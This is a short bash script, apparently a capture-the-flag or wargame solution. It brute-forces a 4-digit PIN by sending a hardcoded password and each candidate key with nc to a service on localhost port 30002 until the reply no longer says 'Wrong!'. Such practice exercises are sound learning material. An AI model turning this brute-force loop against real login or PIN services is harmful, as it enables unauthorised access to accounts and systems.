#!/bin/bash

pass="UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"

for key in `seq 1000 9999`; do
	echo -en "Trying key $key...\r"
	echo "$pass $key" | nc localhost 30002 | grep -q "Wrong!";

	if [ $? -eq 1 ]; then
		echo "Found key $key!"
		echo "$pass $key" | nc localhost 30002
		break
  fi
done
